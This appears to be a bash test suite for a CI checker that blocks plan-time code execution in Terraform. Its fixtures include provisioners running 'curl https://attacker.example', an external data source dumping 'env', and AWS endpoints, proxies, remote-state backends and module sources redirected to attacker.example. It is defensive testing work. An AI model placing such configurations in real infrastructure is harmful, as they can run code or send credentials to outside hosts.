#!/usr/bin/env bash
# Tests for scripts/check-plan-time-exec.py against temp trees (attack corpus).
#   bash scripts/tests/test-check-plan-time-exec.sh   (make test-scripts)
# Needs python-hcl2 (.github/requirements/hcl2.txt). The checker reads its
# allowlists from policies/opa/ of THIS repo, so these cases also prove that
# the .rego parsing works.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCRIPT="${REPO_ROOT}/scripts/check-plan-time-exec.py"
workdir="$(mktemp -d)"
trap 'rm -rf "${workdir}"' EXIT

failures=0
ok() { printf '  ok   %s\n' "$1"; }
bad() { failures=$((failures + 1)); printf '  FAIL %s\n' "$1" >&2; }

# add_file <tree> <relative file> <content>
add_file() {
  mkdir -p "$1/$(dirname "$2")"
  printf '%s\n' "$3" >"$1/$2"
}

# case_tree <name> <relative file> <content>: one file in an otherwise empty tree.
case_tree() {
  local t="${workdir}/$1"
  add_file "${t}" "$2" "$3"
  echo "${t}"
}

# expect_rc <label> <rc> <tree> [<text the output must contain>]
expect_rc() {
  local rc=0
  PLAN_EXEC_ROOT="$3" python3 "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
  if [ "${rc}" -ne "$2" ]; then
    bad "$1 (rc=${rc}, want $2)"
    cat "${workdir}/out" >&2
  elif [ -n "${4:-}" ] && ! grep -qF -- "$4" "${workdir}/out"; then
    bad "$1 (output lacks: $4)"
    cat "${workdir}/out" >&2
  else
    ok "$1"
  fi
}

PROV='resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}'

# --- provisioners -----------------------------------------------------------
expect_rc "clean module passes" 0 "$(case_tree clean modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  bucket = "x"
}')"
expect_rc "bare-label provisioner fails" 1 "$(case_tree bare modules/a/main.tf 'resource terraform_data x {
  provisioner local-exec {
    command = "curl https://attacker.example"
  }
}')" "provisioner"
expect_rc "quoted provisioner fails" 1 "$(case_tree quoted envs/r/main.tf "${PROV}")" "provisioner"
expect_rc "removed-block destroy provisioner fails" 1 "$(case_tree removed envs/r/main.tf 'removed {
  from = terraform_data.z
  provisioner "local-exec" {
    when    = destroy
    command = "id"
  }
}')" "removed block"
expect_rc "removed-block provisioner fails even in vault-secrets" 1 "$(case_tree removedvs modules/supabase/vault-secrets/main.tf 'removed {
  from = terraform_data.z
  provisioner "local-exec" {
    when    = destroy
    command = "id"
  }
}')" "removed block"
expect_rc "tf.json provisioner fails" 1 "$(case_tree json modules/a/main.tf.json '{"//": "comment", "resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}}')" "provisioner"
expect_rc "allowlisted vault-secrets module keeps its provisioner" 0 "$(case_tree allow modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "npm ci"
  }
}')"
expect_rc "look-alike path is not allowlisted" 1 "$(case_tree look modules/evil/supabase/vault-secrets/main.tf "${PROV}")" "provisioner"
expect_rc "e2e fixture keeps its settle provisioner" 0 "$(case_tree e2eok tests/e2e/aws/main.tf 'resource "terraform_data" "archive_settle" {
  provisioner "local-exec" {
    command = "sleep 20"
  }
}')"
expect_rc "e2e fixture: another resource's provisioner fails" 1 "$(case_tree e2ebad tests/e2e/aws/main.tf "${PROV}")" "provisioner"
expect_rc "a file outside the usual folders is scanned" 1 "$(case_tree outside evil/main.tf "${PROV}")" "evil/main.tf"
expect_rc ".terraform is skipped" 0 "$(case_tree dotterraform modules/a/.terraform/modules/m/main.tf "${PROV}")"

# --- external / http data and remote state -------------------------------------
expect_rc "bare-label external data fails" 1 "$(case_tree ext modules/a/main.tf 'data external x {
  program = ["sh", "-c", "env"]
}')" 'data "external"'
expect_rc "tf.json external data fails" 1 "$(case_tree jsondata modules/a/x.tf.json '{"data": {"external": {"x": {"program": ["sh", "-c", "env"]}}}}')" 'data "external"'
expect_rc "check-scoped http data fails" 1 "$(case_tree check modules/a/main.tf 'check "c" {
  data "http" "y" {
    url = "https://attacker.example"
  }
  assert {
    condition     = true
    error_message = "x"
  }
}')" 'data "http"'
expect_rc "remote state with an http backend fails" 1 "$(case_tree rshttp envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "http"
  config = {
    address = "https://attacker.example"
  }
}')" "terraform_remote_state"
expect_rc "remote state backend from a variable fails" 1 "$(case_tree rsvar envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = var.backend
}')" "terraform_remote_state"
expect_rc "remote state with the cloud backend passes" 0 "$(case_tree rsok envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "cloud"
  config = {
    organization = "o"
  }
}')"

# --- providers ----------------------------------------------------------------
expect_rc "registry-qualified external provider fails" 1 "$(case_tree fq modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "registry.terraform.io/hashicorp/external" }
  }
}')" "hashicorp/external"
expect_rc "mixed-case qualified source fails" 1 "$(case_tree mixed modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "Registry.Terraform.IO/HashiCorp/External" }
  }
}')" "hashicorp/external"
expect_rc "third-party provider fails" 1 "$(case_tree third modules/a/versions.tf 'terraform {
  required_providers {
    x = { source = "attacker/exfil" }
  }
}')" "attacker/exfil"
expect_rc "local name aws mapped to a third-party source fails" 1 "$(case_tree remap modules/a/versions.tf 'terraform {
  required_providers {
    aws = { source = "attacker/aws" }
  }
}')" "attacker/aws"
expect_rc "version-only implied provider fails" 1 "$(case_tree implied modules/a/versions.tf 'terraform {
  required_providers {
    http = "~> 3.0"
  }
}')" "hashicorp/http"
expect_rc "allowed qualified provider passes" 0 "$(case_tree okfq modules/a/versions.tf 'terraform {
  required_providers {
    aws = { source = "registry.terraform.io/hashicorp/aws", version = ">= 6.46.0, < 7.0.0" }
  }
}')"
expect_rc "unlisted resource type prefix fails" 1 "$(case_tree prefix modules/a/main.tf 'resource "dns_a_record_set" "x" {
  name = "x"
}')" "hashicorp/dns"
expect_rc "provider block of an undeclared provider fails" 1 "$(case_tree provblock envs/r/providers.tf 'provider "dns" {}')" "hashicorp/dns"
expect_rc "action block of an unlisted provider fails" 1 "$(case_tree action modules/a/main.tf 'action "local_command" "x" {
  config {
    command = "id"
  }
}')" "hashicorp/local"

# --- endpoint, proxy and TLS overrides ------------------------------------------
expect_rc "aws endpoints override fails" 1 "$(case_tree endpoints envs/r/providers.tf 'provider "aws" {
  endpoints {
    sts = "https://attacker.example"
  }
}')" '"endpoints"'
expect_rc "dynamic endpoints block fails" 1 "$(case_tree dynendpoints envs/r/providers.tf 'provider "aws" {
  dynamic "endpoints" {
    for_each = [1]
    content {
      sts = "https://attacker.example"
    }
  }
}')" '"endpoints"'
expect_rc "google custom endpoint fails" 1 "$(case_tree gce envs/r/providers.tf 'provider "google" {
  secret_manager_custom_endpoint = "https://attacker.example/"
}')" "secret_manager_custom_endpoint"
expect_rc "tfe hostname fails" 1 "$(case_tree tfeh envs/r/providers.tf 'provider "tfe" {
  hostname = "attacker.example"
}')" '"hostname"'
expect_rc "tf.json provider proxy fails" 1 "$(case_tree jsonprov envs/r/providers.tf.json '{"provider": {"aws": [{"region": "eu-west-2"}, {"alias": "b", "https_proxy": "http://attacker.example"}]}}')" "https_proxy"
expect_rc "fips switch passes" 0 "$(case_tree fips envs/r/providers.tf 'provider "aws" {
  use_fips_endpoint = true
}')"

# --- module sources -------------------------------------------------------------
expect_rc "git module source fails" 1 "$(case_tree gitmod envs/r/main.tf 'module "m" {
  source = "git::https://attacker.example/x.git//supabase/vault-secrets"
}')" "git::https://attacker.example"
expect_rc "registry module source fails" 1 "$(case_tree regmod envs/r/main.tf 'module "m" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "6.0.0"
}')" "terraform-aws-modules/vpc/aws"
expect_rc "own release module passes" 0 "$(case_tree ownmod examples/r/main.tf 'module "m" {
  source = "git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0"
}')"

# --- the OPA provisioner chain must exist in the code --------------------------
t="${workdir}/chainok"
add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
  source = "../../modules/saas/stages/saas-workload"
}'
add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault_secrets" {
  source = "../../../supabase/vault-secrets"
}'
add_file "${t}" modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "npm ci"
  }
}'
expect_rc "the OPA provisioner chain matches the code" 0 "${t}"
t="${workdir}/chaindrift"
add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
  source = "../../modules/saas/stages/saas-workload"
}'
add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault" {
  source = "../../../supabase/vault-secrets"
}'
expect_rc "a renamed call in the provisioner chain fails" 1 "${t}" "allowed_provisioner_chain"

# --- parser gap: a line that starts with ? or : inside parentheses --------------
expect_rc "leading-operator conditional parses" 0 "$(case_tree leadop envs/r/main.tf 'locals {
  x = (
    var.a
    ? "b"
    : "c"
  )
}')"
expect_rc "leading-operator retry still sees a provisioner" 1 "$(case_tree leadopprov envs/r/main.tf 'locals {
  x = (
    var.a
    ? "b"
    : "c"
  )
}
resource terraform_data x {
  provisioner local-exec {
    command = "id"
  }
}')" "provisioner"
expect_rc "a comment cannot hide a remote-state backend through the retry" 1 "$(case_tree leadopcomment envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = (true # c
    ? "http"
    : "cloud"
  )
}')" "terraform_remote_state"

# --- fail closed -----------------------------------------------------------------
expect_rc "unparseable file fails closed" 1 "$(case_tree broken modules/a/main.tf 'resource "x" {')" "cannot parse"
expect_rc "unparseable tf.json fails closed" 1 "$(case_tree brokenjson modules/a/main.tf.json '{"resource": ')" "cannot parse"

if [ "${failures}" -ne 0 ]; then
  echo "${failures} failure(s)" >&2
  exit 1
fi
echo "check-plan-time-exec: all cases pass"
